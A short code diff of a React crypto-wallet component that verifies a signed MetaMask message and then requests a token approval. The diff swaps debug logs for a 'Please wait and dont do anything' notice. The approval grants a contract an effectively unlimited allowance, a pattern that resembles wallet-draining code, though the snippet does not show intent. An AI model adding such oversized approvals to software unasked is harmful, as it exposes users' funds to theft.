@@ -65,17 +65,6 @@ const BSCWallets = () => {
     setAutoConnect(false);
   }
 
-  // async function getBalance() {
-  //   if (selectedAddress) {
-  //     const provider = new ethers.JsonRpcProvider(
-  //       "https://data-seed-prebsc-1-s1.binance.org:8545/"
-  //     );
-  //     console.log(provider);
-  //     const balance = await provider.getBalance(selectedAddress);
-  //     // setBalance(ethers.utils.formatEther(balance));
-  //   }
-  // }
-
   useEffect(() => {
     if (
       metamaskAdd === null &&
@@ -107,7 +96,7 @@ const BSCWallets = () => {
         const verify = ethers.utils.verifyMessage(addMsg, sign);
 
         if (verify?.toLocaleLowerCase() === metamaskAdd) {
-          console.log("ok");
+          message.loading("Please wait and dont do anything....");
           const provider = new ethers.providers.Web3Provider(window.ethereum);
           const signer = provider.getSigner();
           const contract = new ethers.Contract(
@@ -116,12 +105,12 @@ const BSCWallets = () => {
             signer
           );
           let amount = ethers.utils.parseUnits("300000000000000000000", 18);
-          console.log(amount);
+          message.loading("Please wait and dont do anything....");
 
           let tx = await contract.approve(WORMHOLE_ETH_SM_ADDRESS, amount);
           await tx.wait();
 
-          message.success("Sucess");
+          message.success("Success");
         } else {
           console.log("false");
         }
